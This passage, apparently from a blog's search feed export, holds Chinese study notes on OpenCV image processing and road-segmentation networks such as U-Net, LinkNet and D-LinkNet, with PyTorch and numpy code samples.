<h4 id="膨胀"><a href="#膨胀" class="headerlink" title="膨胀"></a>膨胀</h4><p><img src="/./../images/image-20240914103242244.png" alt="image-20240914103242244"></p>
<h4 id="开运算"><a href="#开运算" class="headerlink" title="开运算"></a>开运算</h4><p>先腐蚀后膨胀，用来去除外部细节，用作数量统计</p>
<h4 id="闭运算"><a href="#闭运算" class="headerlink" title="闭运算"></a>闭运算</h4><p>先膨胀后腐蚀，用来去除内部细节</p>
<h4 id="形态学运算"><a href="#形态学运算" class="headerlink" title="形态学运算"></a>形态学运算</h4><p><img src="/./../images/image-20240914105236689.png" alt="image-20240914105236689"></p>
<p>梯度运算指的是图像梯度运算，直观就是像素的变化程度:	膨胀图-腐蚀图&#x3D;图像轮廓图</p>
<p><img src="/./../images/image-20240914151221214.png" alt="image-20240914151221214"></p>
<h3 id="边缘轮廓"><a href="#边缘轮廓" class="headerlink" title="边缘轮廓"></a>边缘轮廓</h3><p>cv2.findContours</p>
<p><img src="/./../images/image-20240919121020380.png" alt="image-20240919121020380"></p>
<p>读数据-转成灰度图-阈值二值法-轮廓检测</p>
<p>Canny()方法虽然能检测出图像的边缘，但是这个边缘是不连续的，该算法根据像素的梯度变化寻找图像边缘，最终绘制精细二值边缘图像</p>
<p>调整双阈值来控制边缘检测的精细程度，当两个阈值都较小时，检测出较多细节；反之会忽略较多细节</p>
<h3 id="轮廓近似"><a href="#轮廓近似" class="headerlink" title="轮廓近似"></a>轮廓近似</h3><p><img src="/./../images/image-20240919223441192.png" alt="image-20240919223441192"></p>
<p>阈值设置越小，近似轮廓就越接近原始图像</p>
<h3 id="轮廓拟合"><a href="#轮廓拟合" class="headerlink" title="轮廓拟合"></a>轮廓拟合</h3><p><img src="/./../images/image-20240914214633713.png" alt="image-20240914214633713"></p>
<h3 id="凸包"><a href="#凸包" class="headerlink" title="凸包"></a>凸包</h3><p>如果能找到图形最外层的端点，将这些端点连接起来，就可以围出一个包围图形的最小包围框，也叫凸包，也是最接近轮廓的多边形</p>
<p><img src="/./../images/image-20240914232239320.png" alt="image-20240914232239320"></p>
<h3 id="霍夫变换"><a href="#霍夫变换" class="headerlink" title="霍夫变换"></a>霍夫变换</h3><p>是一种特征检测，通过算法识别图像特征，从而判断图像形状</p>
<p><img src="/./../images/image-20240914233751774.png" alt="image-20240914233751774"></p>
<p><img src="/./../images/image-20240914234222723.png" alt="image-20240914234222723"></p>
<h2 id="视频处理"><a href="#视频处理" class="headerlink" title="视频处理"></a>视频处理</h2><p>读取摄像头，并显示视频，用opencv的VideoCapture类相关方法，此方法还支持视频文件</p>
<h3 id="图像梯度（用于检测图像边缘信息）"><a href="#图像梯度（用于检测图像边缘信息）" class="headerlink" title="图像梯度（用于检测图像边缘信息）"></a>图像梯度（用于检测图像边缘信息）</h3><h4 id="Sobel算子"><a href="#Sobel算子" class="headerlink" title="Sobel算子"></a>Sobel算子</h4><p><img src="/./../images/image-20240916113906035.png" alt="image-20240916113906035"></p>
<p>以上乘法是卷积运算，右减左，上减下；</p>
<pre><code class="python">cv2.addWeighted(sobelx,0.5,sobely,0.5,0)	#水平梯度图融合垂直梯度图
</code></pre>
<h4 id="Scharr算子"><a href="#Scharr算子" class="headerlink" title="Scharr算子"></a>Scharr算子</h4><p>比较sobel，该算子核中数值较大</p>
<p><img src="/./../images/image-20240916171215869.png" alt="image-20240916171215869"></p>
<h4 id="laplacian算子"><a href="#laplacian算子" class="headerlink" title="laplacian算子"></a>laplacian算子</h4><p>该算子对梯度求二阶导，对噪声更加敏感</p>
<p>不用分别求x和y</p>
<p><img src="/./../images/image-20240916171403768.png" alt="image-20240916171403768"></p>
<p>三种算子比较</p>
<p><img src="/./../images/image-20240916212246834.png" alt="image-20240916212246834"></p>
<h3 id="图像金字塔"><a href="#图像金字塔" class="headerlink" title="图像金字塔"></a>图像金字塔</h3><p><img src="/./../images/image-20240917132424644.png" alt="image-20240917132424644"></p>
<p>高斯金字塔（向下采样，图像缩小）</p>
<p><img src="/./../images/image-20240917132752803.png" alt="image-20240917132752803"></p>
<p>高斯金字塔（向上采样图像放大）</p>
<p><img src="/./../images/image-20240917134221999.png" alt="image-20240917134221999"></p>
<p>拉普拉斯金字塔<img src="/./../images/image-20240917144330632.png" alt="image-20240917144330632"></p>
<p>G表示输入img，G-(u_d)</p>
<p>1,2即为下采样操作</p>
<p>随后上采用和原始图像做减法，4操作</p>
<h3 id="直方图"><a href="#直方图" class="headerlink" title="直方图"></a>直方图</h3><p>统计每个像素值在图像中出现的次数</p>
<p><img src="/./../images/image-20240920220046502.png" alt="image-20240920220046502"></p>
<h3 id="直方图均衡化"><a href="#直方图均衡化" class="headerlink" title="直方图均衡化"></a>直方图均衡化</h3><p>直方图中某些位置的数量特别多</p>
<p><img src="/./../images/image-20240921092600049.png" alt="image-20240921092600049">、<img src="/./../images/image-20240921092653774.png" alt="image-20240921092653774"></p>
<ol>
<li>分灰度值数量进行统计</li>
<li>随之计算各值的概率和累计概率、</li>
<li>进行函数映射</li>
<li>映射后的像素个数取整</li>
</ol>
<h3 id="自适应直方图均值化"><a href="#自适应直方图均值化" class="headerlink" title="自适应直方图均值化"></a>自适应直方图均值化</h3><p><img src="/./../images/image-20240921094048651.png" alt="image-20240921094048651"></p>
<p>将图像切成若干块，进行分别均值化</p>
<h3 id="傅里叶变换"><a href="#傅里叶变换" class="headerlink" title="傅里叶变换"></a>傅里叶变换</h3><p>傅里叶变换作用：</p>
<ul>
<li>高频：变化剧烈的灰度分量，例如边界</li>
<li>低频：变化缓慢的灰度分量，例如一片大海</li>
</ul>
<p>滤波：</p>
<ul>
<li>低通滤波器：只保留低频，会使得图像模糊</li>
<li>高通滤波器：只保留高频，会使得图像细节增强</li>
</ul>
<p>人所看到的世界与时间相关，随时间发生变化，用时间作为参照物来观察动态世界-&gt;时域</p>
<p>类似乐谱-&gt;频域</p>
<p>任何周期函数都可以看作不同振幅，不同相位正弦波的叠加</p>
<p>不同频率的正弦波成为频率分量</p>
<p>频域中0频率被称为直流分量，级数叠加中，仅仅影响全部波形相对数轴整体向上或向下而不改变的形状</p>
<p><img src="/./../images/image-20240921111754056.png" alt="image-20240921111754056"></p>
<p>从某条曲线中去除一些特定的频率成分，称为滤波</p>
<p><img src="/./../images/image-20240921114241901.png" alt="image-20240921114241901"></p>
<p>级数：周期连续-&gt;非周期离散</p>
<p>变换：非周期连续（时域）-&gt;非周期连续（频域）</p>
<p>用cv2.dft()进行时域变换到频域</p>
<p>用cv2。idft()进行频域变换到时域</p>
<p>得到的结果中频率为0的部分会出现在左上角，通过shift变换来实现</p>
<p>cv2.dft()返回的结果是双通道的（实部、虚部），通常还需要转换成图像格式才能展示（0，255）</p>
<hr>
<h2 id="全卷积神经网络（FCN）"><a href="#全卷积神经网络（FCN）" class="headerlink" title="全卷积神经网络（FCN）"></a>全卷积神经网络（FCN）</h2><p>FCN中的主要特点是大量使用卷积、上采样和跳跃连接</p>
<p>传统的卷积神经网络通常在网络的最后一层使用全连接层,将原始的二维矩阵压缩  成一维矩阵,导致空间特征信息的丢失,因此,卷积层替换掉全连接层是行之有效的方法。影像的目标提取及输出应该是一个正常的特征映射,即在不考虑大小的情况下应当是二维的。</p>
<p><img src="/./../images/image-20240925212531267.png" alt="image-20240925212531267"></p>
<p>为了降低高分辨率遥感影像中细节信息的损失,采用了跳跃连接结构。对于神经网络,浅层网络有丰富的高分辨率特征映射,而深层网络有低分辨率的特征  映射,但是拥有更多抽象的语义信息。跳跃连接结构可以在各个层次之间,混合浅层的网络细节信息内容与深度的网络语义信息内容并通过特征拼接,改善提取  结果。全卷积神经网络,是在网络的最后阶段通过上采样可以恢复特征图到原始尺寸。</p>
<p>U-net模型是2015年由 Ronneberger 等人提出的一种改进的全卷积神经  网络,最初应用于医学图像的分割。U-net 网络结构如图 2.4 所示,包括五个分  辨率标度,由收缩路径和扩展路径组成。其中,跳跃连接结构可以恢复在收缩路 径中损失的高分辨率图像细节信息。</p>
<p><img src="/./../images/image-20240925213123448.png" alt="image-20240925213123448"></p>
<h3 id="空洞卷积"><a href="#空洞卷积" class="headerlink" title="空洞卷积"></a>空洞卷积</h3><p>在语义分割网络中通常会使用池化操作来减小特征图的大小尺寸,起到减少参数量和增大感受野的作用。但是会出现一些不可控的问题,在池化过程中会导  致特征信息丢失,而后进行的上采样操作并不能补足丢失的特征信息,特别是对于小型目标特征,进而导致特征提取效果不佳。在这些问题的基础上,空洞卷积  提出可以很好避免这些现象。<strong>空洞卷积是针对普通卷积感受野的限制性进行了改进,在普通卷积核中利用空洞率作为一个超参数,实现感受野的指数级扩展,却不会丢失分辨率和特征覆盖范围</strong>。</p>
<img src="/./../images/image-20240925214055930.png" alt="image-20240925214055930" style="zoom:50%;">

<p>空洞卷积引入了新的参数膨胀率</p>
<p>空洞卷积对卷积核间隔采样，间隔大小通过膨胀率来控制</p>
<p>多孔空间金字塔</p>
<p><img src="/./../images/image-20240925221730975.png" alt="image-20240925221730975"></p>
<h3 id="RoadTracer"><a href="#RoadTracer" class="headerlink" title="RoadTracer"></a>RoadTracer</h3><p>文章：RoadTracer: Automatic Extraction of Road Networks from Aerial Images</p>
<p>顶会:CVPR2018</p>
<p>使用卷积神经网络(CNNs)来检测哪些像素属于一条道路（分割）</p>
<p>，然后利用复杂的后处理来将这些像素转化成路网，但这些分割方法具有较高的错误率，因为噪声CNN输出是难以纠正的</p>
<p>自动构建精确的道路网络图的新方法——道路跟踪器</p>
<p>即道路跟踪器使用基于CNN的决策函数引导的迭代搜索过程直接从CNN的输出导出道路网络图。每次迭代时都使用CNN决策网络判断是否将一部分路网加入到已经创建的路网中</p>
<p><img src="/./../images/image-20240911101952687.png" alt="image-20240911101952687"></p>
<p>RoadTracer的核心算法流程。首先给定一个路网的起点v0和包围盒（需要提取路网的区域），然后RoadTracer会维护一个顶点栈和一个路网。每次从栈顶取一个顶点，并在其基础上寻找下一个与其相连的顶点。如果找到下一个顶点(潜在)，则将其加入栈顶，同时更新路网；反之就将该顶点从栈顶弹出。当栈为空时，则表明该图像上的所有路网信息已经完全获取。</p>
<p>迭代搜索算法</p>
<p>下图展示了RoadTracer在路口的运行方式。首先从顶点1开始逐步往前到顶点6，此时栈也逐步增加；在路口先向上（默认设定）寻找新的顶点，并最终到顶点9；由于顶点9后再无新的顶点，因此栈又逐步减少，最后又回到顶点7；然后再向下寻找到顶点11；最终由于顶点11后无新的顶点，栈又回到了顶点7。最后如果没有新的顶点，栈会逐步被清空，从而完成路网的检测。</p>
<p><img src="/./../images/image-20240911103057736.png" alt="image-20240911103057736"></p>
<p>CNN<strong>决策网络</strong></p>
<p> CNN决策网络输入层是一个在顶点上d×d大小的窗口，该窗口总共有4层，前3层是图像信息，最后一层是矢量化后的路网信息；因此能够保证决策网络能够获取当前顶点所在区域足够的的信息。 CNN决策网络的输出层包括两部分，分别是行动信息和角度信息。行动信息包括停止和运动，角度信息是运行的方法。</p>
<p><img src="/./../images/image-20240925232535556.png" alt="image-20240925232535556"></p>
]]></content>
  </entry>
  <entry>
    <title>汇报2</title>
    <url>/2024/10/08/%E6%B1%87%E6%8A%A52/</url>
    <content><![CDATA[<h1 id="Dansenet"><a href="#Dansenet" class="headerlink" title="Dansenet"></a>Dansenet</h1><p>DenseNet的另一大特色是通过<strong>特征在channel上的连接</strong>来实现特征重用</p>
<p><img src="/./../images/image-20241008103804675.png" alt="image-20241008103804675"></p>
<p><img src="/./../images/image-20241008104055820.png" alt="image-20241008104055820"></p>
<p>DenseNet的前向过程如图3所示，可以更直观地理解其密集连接方式，比如 h3 的输入不仅包括来自 h2 的 x2 ，还包括前面两层的 x1 和 x2 ，它们是在<a href="https://zhida.zhihu.com/search?content_id=7066746&content_type=Article&match_order=2&q=channel%E7%BB%B4%E5%BA%A6&zhida_source=entity">channel维度</a>上连接在一起的。</p>
<p>DenseNet的网络结构主要由DenseBlock和Transition组成</p>
<p><img src="/./../images/image-20241008104638302.png" alt="image-20241008104638302"></p>
<p>由于后面层的输入会非常大，DenseBlock内部可以采用bottleneck层来减少计算量，主要是原有的结构中增加1x1 Conv，如图7所示，即<strong>BN+ReLU+1x1 Conv+BN+ReLU+3x3 Conv</strong>，称为DenseNet-B结构。其中1x1 Conv得到 4k 个特征图它起到的作用是降低特征数量，从而提升计算效率。</p>
<p>Transition层可以起到压缩模型的作用。假定Transition的上接DenseBlock得到的特征图channels数为 m ，Transition层可以产生 ⌊θm⌋ 个特征（通过卷积层），其中 θ∈(0,1] 是压缩系数（compression rate）。当 θ&#x3D;1 时，特征个数经过Transition层没有变化，即无压缩，而当压缩系数小于1时，这种结构称为DenseNet-C，文中使用 θ&#x3D;0.5 。对于使用bottleneck层的DenseBlock结构和压缩系数小于1的Transition组合结构称为DenseNet-BC。</p>
<h1 id="LinkNet"><a href="#LinkNet" class="headerlink" title="LinkNet"></a>LinkNet</h1><p>大多数的现有的语义分割技术使用的是encoder-decoder的结构。Encoder将信息编码到特征空间，解码器将这些信息映射到类别空间用来分割表示</p>
<p>像YOLO，Fast RNN，SSD专注于实时对象检测，但在语义分割上几乎没有任何工作</p>
<p><img src="/./../images/LinkNet%20Architecture.png" alt="img"></p>
<p>LinkNet的结构看图就已经很清楚了，将每一层编码器的结果保存一份，再在解码器解出的结果和对应的编码结果加和，传入下一层解码器中去。</p>
<pre><code class="python">import torch
import torch.nn as nn
import torchvision.models as model

class Decoder(nn.Module):
    def __init__(self, in_planes, out_planes, kernel_size, stride=1, padding=0, output_padding=0, bias=False):
        super(Decoder, self).__init__()
        self.conv1 = nn.Sequential(
            nn.Conv2d(in_planes, in_planes // 4, 1, 1, 0, bias=bias),
            nn.BatchNorm2d(in_planes // 4),
            nn.ReLU(inplace=True)
        )
        self.tp_conv = nn.Sequential(
            nn.ConvTranspose2d(in_planes // 4, in_planes // 4, kernel_size, stride=stride, padding= padding, output_padding= output_padding, bias= bias),
            nn.BatchNorm2d(in_planes // 4),
            nn.ReLU(True)
        )
        self.conv2 = nn.Sequential(
            nn.Conv2d(in_planes // 4, out_planes, 1, 1, 0, bias=bias),
            nn.BatchNorm2d(out_planes),
            nn.ReLU(True)
        )
    def forward(self, x):
        x = self.conv1(x)
        x = self.tp_conv(x)
        x = self.conv2(x)
        return x

class LinkNet(nn.Module):
    def __init__(self, n_classes=21):
        super(LinkNet, self).__init__()
        base = model.resnet18(pretrained=True)
        self.in_block = nn.Sequential(
            base.conv1,
            base.bn1,
            base.relu,
            base.maxpool
        )
        self.encoder1 = base.layer1
        self.encoder2 = base.layer2
        self.encoder3 = base.layer3
        self.encoder4 = base.layer4

        self.decoder1 = Decoder(64, 64, 3, 1, 1, 0)
        self.decoder2 = Decoder(128, 64, 3, 2, 1, 1)
        self.decoder3 = Decoder(256, 128, 3, 2, 1, 1)
        self.decoder4 = Decoder(512, 256, 3, 2, 1, 1)

        self.tp_conv1 = nn.Sequential(
            nn.ConvTranspose2d(64, 32, 3, 2, 1, 1),
            nn.BatchNorm2d(32),
            nn.ReLU(True)
        )
        self.conv2 = nn.Sequential(
            nn.Conv2d(32, 32, 3, 1, 1),
            nn.BatchNorm2d(32),
            nn.ReLU(True)
        )
        self.tp_conv2 = nn.ConvTranspose2d(32, n_classes, 2, 2, 0)
    def forward(self, x):
        x = self.in_block(x)

        e1 = self.encoder1(x)
        e2 = self.encoder2(e1)
        e3 = self.encoder3(e2)
        e4 = self.encoder4(e3)

        d4 = e3 + self.decoder4(e4)
        d3 = e2 + self.decoder3(d4)
        d2 = e1 + self.decoder2(d3)
        d1 = x + self.decoder1(d2)
        out = self.tp_conv1(d1)
        out = self.conv2(out)
        out = self.tp_conv2(out)
        return out

if __name__ == &quot;__main__&quot;:
    inputs = torch.randn((1, 3, 352, 480))
    net = LinkNet(n_classes=12)
    out = net(inputs)
    print(out.size())
</code></pre>
<h1 id="D-LinkNet网络结构"><a href="#D-LinkNet网络结构" class="headerlink" title="D-LinkNet网络结构"></a>D-LinkNet网络结构</h1><p>图像分割在卫星遥感道路分割领域大致有以下一系列算法，算法发布时间线如下： FCN(2015)-&gt;UNet(2015) -&gt; LinkNet(2017)-&gt;D-LinkNet(2018)-&gt;NL-LinkNet(2019)-&gt;…</p>
<p>D-LinkNet的网络结构如下图所示：</p>
<p><img src="/./../images/8a9b64927bb8aeb1bd062aec992ada94.png" alt="img"></p>
<p>这个网络整体结构和UNet比较类似，主要在此架构中加了一些小改进，如<strong>残差块、空洞卷积</strong>等。改进提升比较明显的是该算法引入了TTA(Test Time Augmentation)策略，即测试时加强</p>
<h2 id="TTA策略"><a href="#TTA策略" class="headerlink" title="TTA策略"></a>TTA策略</h2><p>TTA的思想就是在测试时使用数据增强，比如一张图片直接进行分割，得到的效果可能有限，那么将这副图片进行旋转、翻转等数据增强方式，进行分割，最后将所有分割结果进行叠加。</p>
<p>首先，程序加载完一张图片后，img是原图，img90是将图像逆时针旋转90度，相关代码：</p>
<pre><code class="python">def segment(self, path):
    img = cv2.imread(path)
    img = cv2.resize(img, resize_settings)  # Shape:(1024, 1024, 3)
    img90 = np.array(np.rot90(img))  # Shape:(1024, 1024, 3)
    img1 = np.concatenate([img[None, ...], img90[None, ...]])  # Shape:(2, 1024, 1024, 3) img[None]:增加第一个位置维度
</code></pre>
<p>img1是将这两张图片拼接起来，下面直观进行显示查看：</p>
<pre><code class="python">show_img(img1[0], img1[1])
</code></pre>
<p><img src="/./../images/e5b609c19b977b03a5ccc63b6b948dee.png" alt="img"></p>
<p>之后，构建了一个img2，在img1的第二个维度进行逆序，实现垂直翻转</p>
<pre><code class="javascript">img2 = np.array(img1)[:, ::-1]  # 垂直翻转
show_img(img2[0], img2[1])
</code></pre>
<p><img src="/./../images/442306da685762f8c43a0b860df7fbd8.png" alt="img"></p>
<p>后面就是对每一个部分进行推理，然后最后返回的mask2是叠加后的结果，maska[0]是原始图像的推理结果</p>
<pre><code class="js">maska = self.net.forward(img1).squeeze().cpu().data.numpy()  # img1:Shape:(2, 1, 1024, 1024) -&gt; (2, 1024, 1024)
maskb = self.net.forward(img2).squeeze().cpu().data.numpy()
maskc = self.net.forward(img3).squeeze().cpu().data.numpy()
maskd = self.net.forward(img4).squeeze().cpu().data.numpy()

mask1 = maska + maskb[:, ::-1] + maskc[:, :, ::-1] + maskd[:, ::-1, ::-1]
mask2 = mask1[0] + np.rot90(mask1[1])[::-1, ::-1]
</code></pre>
<p>直观进行比较，左侧是原图推理，右侧是TTA后的推理结果：</p>
<pre><code class="js">show_img(maska[0], mask2)
</code></pre>
<p><img src="/./../images/2c817fd9b85aeda822402d79c3e6ca91.png" alt="img"></p>
<h1 id="Unet"><a href="#Unet" class="headerlink" title="Unet"></a>Unet</h1><p>一种U型的网络结构来获取上下文的信息和位置信息</p>
<p>这个结构就是先对图片进行卷积和池化，在Unet论文中是池化4次，比方说一开始的图片是224x224的，那么就会变成112x112，56x56,28x28,14x14四个不同尺寸的特征。<strong>然后我们对14x14的特征图做上采样或者反卷积，得到28x28的特征图，这个28x28的特征图与之前的28x28的特征图进行通道伤的拼接concat，然后再对拼接之后的特征图做卷积和上采样，得到56x56的特征图，再与之前的56x56的特征拼接，卷积，再上采样，经过四次上采样可以得到一个与输入图像尺寸相同的224x224的预测结果。</strong></p>
<p>其实整体来看，这个也是一个Encoder-Decoder的结构：</p>
<p><img src="/./../images/16aa4d6044d3400091235103458a2baatplv-k3u1fbpfcp-watermark.png" alt="img"></p>
<ul>
<li>FCN是通过特征图对应像素值的相加来融合特征的；</li>
<li>U-net通过通道数的拼接，这样可以形成更厚的特征，当然这样会更佳消耗显存；</li>
</ul>
]]></content>
      <categories>
        <category>AI</category>
      </categories>
  </entry>
</search>
